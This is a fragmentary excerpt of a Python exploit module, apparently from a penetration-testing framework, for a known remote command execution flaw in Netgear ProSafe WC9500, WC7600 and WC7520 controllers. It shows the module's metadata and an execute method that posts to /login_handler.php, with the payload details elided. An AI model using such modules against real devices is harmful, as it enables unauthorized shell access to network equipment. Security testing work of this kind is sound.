...
class Exploit(HTTPClient):
    __info__ = {'name': 'Netgear ProSafe RCE', 'description': 'Module exploits remote command execution vulnerability in Netgear ProSafe WC9500, WC7600, WC7520 devices. If the target is vulnerable command shell is invoked.', 'authors': ('Andrei Costin <andrei[at]firmware.re>', 'Marcin Bury <marcin[at]threat9.com>'), 'references': ('http://firmware.re/vulns/acsa-2015-002.php', 'https://www.blackhat.com/docs/asia-16/materials/asia-16-Costin-Automated-Dynamic-Firmware-Analysis-At-Scale-A-Case-Study-On-Embedded-Web-Interfaces.pdf'), 'devices': ('Netgear ProSafe WC9500', 'Netgear ProSafe WC7600', 'Netgear ProSafe WC7520')}
    ...
    def execute(self, cmd):
        ...
        response = self.http_request(method='POST', path='/login_handler.php', headers=headers, data=data)
        if response is None:
            return ''
